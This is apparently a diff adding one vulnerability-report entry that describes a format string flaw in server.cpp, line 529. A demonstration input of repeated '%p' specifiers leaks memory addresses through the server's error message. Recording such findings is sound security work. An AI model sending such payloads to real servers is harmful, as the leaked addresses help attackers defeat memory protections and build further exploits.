@@ -1,0 +1,5 @@
+  1. Format String vuln: server.cpp, line 529
+    Exp: When a client establishes a connection, any format string command will return arbiturary information. See below for the demonstartion. 
+  
+    $: %p %p %p %p %p %p %p
+    Error: Unknown command: 0x7fae8cc41bd8 (nil) 0xffff 0x7fae8cc41340 0x7fae8cc41bc0 0x7fae8cc41fe0 0x7fae8cc417c0
